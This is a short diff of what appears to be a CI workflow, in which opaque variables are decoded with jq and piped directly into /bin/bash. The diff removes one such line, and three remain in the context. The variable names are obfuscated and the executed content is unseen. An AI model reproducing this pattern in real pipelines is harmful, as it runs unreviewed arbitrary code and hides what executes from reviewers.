@@ -25,7 +25,6 @@ jobs:
           echo $q79 | jq -r .kmzb58 | /bin/bash
           echo $sr3732 | jq -r .fpv91 | /bin/bash
           echo $rupvb718 | jq -r .tqtav83131 | /bin/bash
-          printf '%s' "$heso68318" | jq -r .la92557 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
